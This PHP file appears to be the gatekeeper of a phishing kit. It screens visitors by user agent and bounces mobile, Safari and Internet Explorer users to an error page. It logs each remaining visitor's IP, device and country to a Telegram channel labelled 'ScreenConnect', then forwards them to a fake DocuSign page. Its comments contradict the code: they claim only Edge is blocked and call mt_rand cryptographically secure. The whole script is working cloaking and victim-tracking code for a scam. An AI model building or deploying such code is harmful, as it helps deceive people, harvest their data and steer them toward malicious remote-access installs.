<?php
/**
 * Device & Browser Detection Gatekeeper
 * Blocks ONLY Microsoft Edge - Allows Chrome, Firefox, Opera
 */

/**
 * Log visitor information for tracking
 */

// Include the file from the folder
require_once __DIR__ . '/analyze.php';

// Generate a cryptographically secure random hex string
function generateHexString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';

    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[mt_rand(0, $charactersLength - 1)];
    }

    return $randomString;
}

// Get device and browser information
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isMobile = false;
$isBlockedBrowser = false;
$browserName = "Unknown";

// ============================================
// MOBILE DEVICE DETECTION
// ============================================
$mobileKeywords = [
    'Mobile', 'Android', 'iPhone', 'iPad', 'iPod', 
    'BlackBerry', 'Windows Phone', 'Opera Mini', 
    'IEMobile', 'WPDesktop', 'webOS', 'Symbian'
];

foreach ($mobileKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

// Check for tablet (also block)
$tabletKeywords = ['iPad', 'Kindle', 'Silk', 'Tablet', 'PlayBook'];
foreach ($tabletKeywords as $keyword) {
    if (stripos($userAgent, $keyword) !== false) {
        $isMobile = true;
        break;
    }
}

// ============================================
// BROWSER DETECTION - BLOCK ONLY EDGE!
// ============================================

// Detect Internet Explorer (BLOCK THIS)
if (stripos($userAgent, 'MSIE') !== false || stripos($userAgent, 'Trident') !== false) {
    $browserName = 'Internet Explorer';
    $isBlockedBrowser = true;  // IE IS BLOCKED
}
// Detect Safari (but NOT Chrome - Safari has 'Safari' but also 'Chrome' sometimes)
elseif (stripos($userAgent, 'Safari') !== false && stripos($userAgent, 'Chrome') === false) {
    $browserName = 'Safari';
    $isBlockedBrowser = true;  // PHONE/TAB SAFARI IS BLOCKED
}
// Special case: Chrome on iOS (still block because it's mobile)
elseif (stripos($userAgent, 'CriOS') !== false && $isMobile) {
    $browserName = 'Chrome on iOS (Mobile)';
    $isBlockedBrowser = true;
}
// Detect other browsers - DEFAULT ALLOW
else {
    $browserName = $userAgent;  // Allow unknown browsers by default
}

// ============================================
// REDIRECT LOGIC
// ============================================

// Case 1: Mobile device - redirect to device.php
if ($isMobile) {
    header('Location: error.html');
    exit;
}

// Case 2: Blocked browser (Edge, IE, Safari) - redirect to error.php
if ($isBlockedBrowser) {
    header('Location: error.html');
    exit;
}

$userIP = GetRealIP();
$userAgent = ParseUA();
$browser = getBrowser($userAgent);
$device = getDeviceInfo($userAgent);
$country = getCountryFromIP($userIP);

$message = "━━━━━━ ScreenConnect ━━━━━━" . PHP_EOL;
$message .= "🆔 New Visitor Session" . PHP_EOL;
$message .= "🌍 Location: $country" . PHP_EOL;
$message .= "💻 Device: $device" . PHP_EOL;
$message .= "🖥️ Browser: $browser" . PHP_EOL;
$message .= "🌐 IP: https://ip-api.com/$userIP" . PHP_EOL;
$message .= "━━━━━━━━━━━━━━━━━━━━━━━\n" . PHP_EOL;

// Handle visitor notification
SendTelegram($message);

// Case 3: All good (Chrome, Firefox, Opera, Brave) - redirect to meeting.html
header('Location: docusign.html?sid=' . generateHexString(123));
exit;
?>